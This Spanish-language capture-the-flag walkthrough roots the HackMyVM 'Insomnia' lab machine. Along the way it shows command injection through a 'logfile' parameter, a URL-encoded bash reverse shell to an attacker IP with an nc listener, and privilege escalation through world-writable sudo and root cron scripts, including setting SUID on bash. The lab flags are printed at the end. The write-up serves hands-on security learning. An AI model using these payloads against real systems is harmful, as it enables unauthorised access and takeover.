---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Insomnia HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 03:29 EDT
Nmap scan report for 192.168.5.21
Host is up (0.00082s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)
|_http-title: Chat
MAC Address: 08:00:27:F2:3B:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
```

Vemos que hay un puerto `8080` en el que aloja una pagina web, si entramos dentro simplemente veremos un recuadro en el que nos pide que ingresemos un nombre de usuario, por defecto nos pone el usuario `guest` por lo que vamos a dejarlo asi.

Dandole a `Ok` nos llevara a una pagina en la que hay como una especie de chat donde podemos ingresar mensajes, si probamos a realizar un `XSS` veremos que va mas o menos, pero como que no se llega a ejecutar bien, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>:8080/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.21:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.5.21:8080/0ba12198-b861-48a1-b54e-2b54963392cd => 200 (Length: 2899). To continue please exclude the status code or the length
```

Nos pondra esto, por lo que tendremos que exluir la longitud que en este caso seria `2899`.

```shell
gobuster dir -u http://<IP>:8080/ -w <WORDLIST> -x html,php,txt -t 50 -k -r --exclude-length 2899
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.21:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          2899
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/chat.txt             (Status: 200) [Size: 78]
/administration.php   (Status: 200) [Size: 65]
/process.php          (Status: 200) [Size: 2]

```

Vemos varias cosas interesantes, vamos a probar a entrar en el archivo llamado `administration.php` a ver que vemos.

```
URL = http://<IP>:8080/administration.php
```

Info:

```
You are not allowed to view :  
Your activity has been logged
```

Vemos que parece que tenemos que estar `logueados` vamos a ver el otro archivo.

```
URL = http://<IP>:8080/administration.php
```

Info:

```
[]
```

Tampoco vemos nada interesante, vamos a volver al archivo `administration.php` y probaremos a realizar `fuzzing` en busca de algun parametro de `PHP` que pueda ser vulnerable.

## FFUF

```shell
ffuf -u http://<IP>:8080/administration.php\?FUZZ\=/etc/passwd -w <WORDLIST> -fs 65
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.5.21:8080/administration.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 65
________________________________________________
logfile                 [Status: 200, Size: 76, Words: 12, Lines: 3, Duration: 1214ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Vemos que hemos encontrado un parametro llamado `logfile`, vamos a probarlo en dicho archivo a ver que vemos.

```
URL = http://<IP>:8080/administration.php?logfile=/etc/passwd
```

Info:

```
You are not allowed to view : /etc/passwd  
Your activity has been logged
```

No veremos gran cosa, pero si vamos al `chat` de la pagina veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-17 095055.png" alt=""><figcaption></figcaption></figure>

Vemos que se esta contemplando lo que hemos enviado, vamos a probar a enviar un comando directamente en vez de intentar leer un archivo.

Pero veremos que no se ejecuta, vamos a probar a poner primero `chat.txt` que sabemos que existe para ver si ese es el problema y que se piense que estamos `logueados` y despues concatenarlo con un comando.

```
URL = http://<IP>:8080/administration.php?logfile=chat.txt; id
```

Info:

```
You are not allowed to view : chat.txt; id  
Your activity has been logged
```

Ahora si volvemos al `chat` de la pagina principal, veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-17 095338.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado de forma correcta, por lo que vamos a generar una `reverse shell` de esta forma:

```
URL = http://<IP>:8080/administration.php?logfile=chat.txt%3B%20bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP_ATTACKER>%2F<PORT>%200%3E%261%22
```

Antes de enviarlo vamos a ponernos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el comando de la `URL` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.21] 42496
bash: cannot set terminal process group (351): Inappropriate ioctl for device
bash: no job control in this shell
www-data@insomnia:~/html$ whoami
whoami
www-data
```

Vemos que hemos obtenido acceso de forma correcta, por lo que tendremos que sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user julia

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on insomnia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on insomnia:
    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh
```

Veremos que podemos ejecutar el `script` `start.sh` como el usuario `julia` por lo que vamos a ver que hace dicho `script`.

Si listamos los permisos que tiene veremos lo siguiente:

```shell
ls -la /var/www/html/start.sh
```

Info:

```
-rwxrwxrwx 1 root root 20 Dec 21  2020 /var/www/html/start.sh
```

Vemos que podemos modificar el `script` a nuestro gusto, por lo que haremos lo siguiente.

```shell
cd /var/www/html/
rm start.sh
nano start.sh

#Dentro del nano
#!/bin/bash

/bin/bash
```

Lo guardamos y le ponemos permisos de ejecuccion.

```shell
chmod +x start.sh
```

Ahora si lo ejecutamos de esta forma:

```shell
sudo -u julia bash /var/www/html/start.sh
```

Info:

```
julia@insomnia:/var/www/html$ whoami
julia
```

Vemos que ya seremos dicho usuario por lo que leeremos la `flag` del usuario.

> user.txt

```
~~~~~~~~~~~~~\
USER INSOMNIA
~~~~~~~~~~~~~
Flag : [c2e285cb33cecdbeb83d2189e983a8c0]
```

## Escalate Privileges

Despues de buscar un rato si leemos los `crontabs` que hay en el sistema, veremos lo siguiente:

```shell
cat /etc/crontab
```

Info:

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/bash /var/cron/check.sh
#
```

Vemos que el usuario `root` esta ejecutando un `crontab` respecto al archivo llamado `check.sh` vamos a investigar dicho archivo.

Si listamos los permisos del archivo veremos esto:

```shell
ls -la /var/cron/check.sh
```

Info:

```
-rwxrwxrwx 1 root root 153 Dec 21  2020 /var/cron/check.sh
```

Vemos que tambien lo podremos escribir, por lo que vamos abrir el archivo con `nano` y añadiremos una liena mas que sera la siguiente:

```shell
nano /var/cron/check.sh

#Dentro del nano
chmod u+s /bin/bash
................................<RESTO_DEL_CODIGO>.................................
```

Lo guardamos y solo tendremos que esperar un ratito a que se ejecute como `root`, despues de un rato si listamos la `bash` para ver si funciono, veremos esto.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Vemos que efectivamente a funcionado, por lo que haremos esto:

```shell
bash -p
```

Info:

```
bash-5.0# whoami
root
```

Y con esto ya seremos el usuario `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
~~~~~~~~~~~~~~~\
ROOTED INSOMNIA
~~~~~~~~~~~~~~~
Flag : [c84baebe0faa2fcdc2f1a4a9f6e2fbfc]

by Alienum with <3
```
